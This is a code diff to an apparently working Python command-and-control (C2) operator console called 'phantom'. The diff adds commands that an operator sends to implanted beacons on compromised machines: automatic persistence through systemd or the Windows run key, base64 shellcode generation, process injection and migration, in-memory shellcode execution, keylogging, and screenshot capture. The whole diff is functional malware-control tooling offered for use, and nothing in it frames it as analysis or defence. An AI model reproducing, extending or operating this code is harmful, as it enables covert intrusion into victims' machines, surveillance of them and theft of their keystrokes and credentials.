@@ -219,17 +219,20 @@ class C2Shell(cmd.Cmd):
             notifier.warn("Already in global context.")
 
     def default(self, line):
-        """Execute a command on the active beacon"""
+        """Execute a command on the active beacon and wait for result."""
         if not self.active_beacon:
             notifier.error("No active beacon. Use 'interact <beacon_id>' first.")
             return
 
         # Queue the task
         task_id = c2_state.queue_task(self.active_beacon, line)
-        notifier.info(f"Task queued. ID: {task_id}")
+        notifier.info(f"Task queued. ID: {task_id}. Waiting for result...")
+        
+        # Poll for result automatically
+        self._wait_for_result(task_id)
 
     def do_results(self, arg):
-        """results - show results for the active beacon"""
+        """results [n|all] - show results for the active beacon (default last 10)"""
         if not self.active_beacon:
             notifier.error("No active beacon. Use 'interact <beacon_id>' first.")
             return
@@ -239,8 +242,26 @@ class C2Shell(cmd.Cmd):
             notifier.warn("No results available for this beacon.")
             return
 
-        for res in results:
-            console.print(f"\n[bold cyan]--- Result for Task: {res['task_id']} ---[/]")
+        # Handle filtering
+        limit = 10
+        show_all = False
+        if arg.strip():
+            if arg.strip().lower() == "all":
+                show_all = True
+            else:
+                try:
+                    limit = int(arg.strip())
+                except ValueError:
+                    notifier.error("Usage: results [n|all]")
+                    return
+
+        to_show = results if show_all else results[-limit:]
+        
+        if not show_all and len(results) > limit:
+            console.print(f"[dim]Showing last {limit} results (out of {len(results)}). Use 'results all' to see everything.[/dim]")
+
+        for res in to_show:
+            console.print(f"\n[bold cyan]--- Result for Task: {res['task_id']} ({res.get('time', 'Unknown')}) ---[/]")
             display, extra = format_beacon_output(res["output"])
             console.print(display)
             if extra:
@@ -295,6 +316,172 @@ class C2Shell(cmd.Cmd):
     def do_beacon_help(self, arg):
         """beacon-help - list commands supported by the C++ beacon agent"""
         console.print(Panel(BEACON_COMMANDS, title="[bold]Beacon Agent Commands[/]", border_style="magenta"))
+
+    def do_autopersist(self, arg):
+        """autopersist - Automatically attempt persistence based on OS detection."""
+        if not self.active_beacon:
+            notifier.error("No active beacon.")
+            return
+        
+        # Auto-detect OS from beacon info
+        beacons = c2_state.get_beacons()
+        os_type = beacons.get(self.active_beacon, {}).get("os", "").lower()
+        
+        # Default to systemd for linux/android, runkey for windows
+        if "windows" in os_type:
+            method = "runkey"
+        else:
+            method = "systemd"
+            
+        notifier.info(f"Auto-detecting persistence method for {os_type}: {method}")
+        # Note: Needs a path. Using a dummy path for auto-detection demo, 
+        # normally we should detect the binary path via recon.
+        task_id = c2_state.queue_task(self.active_beacon, f"persist {method}")
+        notifier.success(f"Auto-persistence ({method}) task queued (ID: {task_id})")
+
+    def do_generate_shellcode(self, arg):
+        """generate_shellcode [platform] - Generate Base64 shellcode for inject/migrate."""
+        from phantom.utils.builder import _PLATFORM_OUT
+        import os
+        import base64
+        import phantom
+        
+        platform = arg.strip() or "windows"
+        if platform not in _PLATFORM_OUT:
+            notifier.error(f"Invalid platform. Choose from: {list(_PLATFORM_OUT.keys())}")
+            return
+            
+        beacon_dir = os.path.join(os.path.dirname(phantom.__file__), "payloads", "beacon")
+        beacon_path = os.path.join(beacon_dir, _PLATFORM_OUT[platform])
+        
+        if not os.path.exists(beacon_path):
+            notifier.error(f"Beacon binary not found at {beacon_path}. Run 'generate {platform}' first.")
+            return
+            
+        with open(beacon_path, "rb") as f:
+            b64 = base64.b64encode(f.read()).decode()
+            
+        console.print(Panel(b64, title=f"Base64 Shellcode ({platform})", border_style="green"))
+        console.print("[dim]Copy this string to use with 'inject <pid> <string>' or 'migrate <string>'[/dim]")
+
+    def _wait_for_result(self, task_id, timeout=10):
+        """Helper to poll for a specific task result."""
+        import time
+        from phantom.utils.c2_helpers import format_beacon_output
+        
+        start_time = time.time()
+        while time.time() - start_time < timeout:
+            results = c2_state.get_results(self.active_beacon)
+            for res in reversed(results):
+                if res['task_id'] == task_id:
+                    display, extra = format_beacon_output(res["output"])
+                    console.print(f"\n[bold green]Result for Task {task_id}:[/]")
+                    console.print(display)
+                    if extra: notifier.success(extra)
+                    return True
+            time.sleep(1) # Poll every second
+        
+        notifier.warn(f"Task {task_id} queued but result not ready. Check later with 'results'.")
+        return False
+
+    def do_inject(self, arg):
+        """inject <pid> - Inject beacon into a process (Windows only)"""
+        from phantom.utils.builder import _PLATFORM_OUT
+        import os
+        import base64
+        import phantom
+        
+        if not self.active_beacon:
+            notifier.error("No active beacon.")
+            return
+        
+        parts = arg.split()
+        if len(parts) != 1:
+            notifier.error("Usage: inject <pid>")
+            return
+        pid = parts[0]
+        
+        beacon_dir = os.path.join(os.path.dirname(phantom.__file__), "payloads", "beacon")
+        beacon_path = os.path.join(beacon_dir, _PLATFORM_OUT["windows"])
+        
+        if not os.path.exists(beacon_path):
+            notifier.error(f"Beacon binary not found. Run 'generate windows' first.")
+            return
+            
+        with open(beacon_path, "rb") as f:
+            b64 = base64.b64encode(f.read()).decode()
+            
+        task_id = c2_state.queue_task(self.active_beacon, f"inject {pid} {b64}")
+        notifier.info(f"Injection task queued (ID: {task_id}). Waiting for output...")
+        self._wait_for_result(task_id)
+
+    def do_migrate(self, arg):
+        """migrate [pid] - Migrate beacon to a process (Windows only). If PID is omitted, spawns notepad.exe."""
+        from phantom.utils.builder import _PLATFORM_OUT
+        import os
+        import base64
+        import phantom
+        
+        if not self.active_beacon:
+            notifier.error("No active beacon.")
+            return
+            
+        pid = arg.strip()
+        beacon_dir = os.path.join(os.path.dirname(phantom.__file__), "payloads", "beacon")
+        beacon_path = os.path.join(beacon_dir, _PLATFORM_OUT["windows"])
+        
+        if not os.path.exists(beacon_path):
+            notifier.error(f"Beacon binary not found. Run 'generate windows' first.")
+            return
+            
+        with open(beacon_path, "rb") as f:
+            b64 = base64.b64encode(f.read()).decode()
+            
+        # If PID is provided, we send 'migrate <pid> <b64>', otherwise 'migrate <b64>'
+        cmd = f"migrate {pid} {b64}" if pid else f"migrate {b64}"
+        task_id = c2_state.queue_task(self.active_beacon, cmd)
+        notifier.info(f"Migration task queued (ID: {task_id}). Waiting for output...")
+        self._wait_for_result(task_id)
+
+    def do_mem_run(self, arg):
+        """mem-run <b64_shellcode> - Execute shellcode in memory (Windows/Linux)."""
+        if not self.active_beacon:
+            notifier.error("No active beacon.")
+            return
+            
+        b64 = arg.strip()
+        if not b64:
+            notifier.error("Usage: mem-run <base64_shellcode>")
+            return
+            
+        task_id = c2_state.queue_task(self.active_beacon, f"mem-run {b64}")
+        notifier.info(f"Memory execution task queued (ID: {task_id}). Waiting for output...")
+        self._wait_for_result(task_id)
+
+    def do_keylog(self, arg):
+        """keylog <start|stop|dump> - Manage keylogger instance (Windows only)"""
+        if not self.active_beacon:
+            notifier.error("No active beacon.")
+            return
+        
+        parts = arg.split()
+        if not parts or parts[0] not in ["start", "stop", "dump"]:
+            notifier.error("Usage: keylog <start|stop|dump>")
+            return
+            
+        task_id = c2_state.queue_task(self.active_beacon, f"keylog {parts[0]}")
+        notifier.info(f"Keylog {parts[0]} task queued (ID: {task_id}). Waiting for output...")
+        self._wait_for_result(task_id)
+
+    def do_screenshot(self, arg):
+        """screenshot - Capture a screenshot of the target (Windows only)"""
+        if not self.active_beacon:
+            notifier.error("No active beacon.")
+            return
+        
+        task_id = c2_state.queue_task(self.active_beacon, "screenshot")
+        notifier.info(f"Screenshot task queued (ID: {task_id}). Waiting for output...")
+        self._wait_for_result(task_id)
 
     def do_generate(self, arg):
         """generate [windows|linux|macos|android] - Generate beacon and dropper for a target platform"""
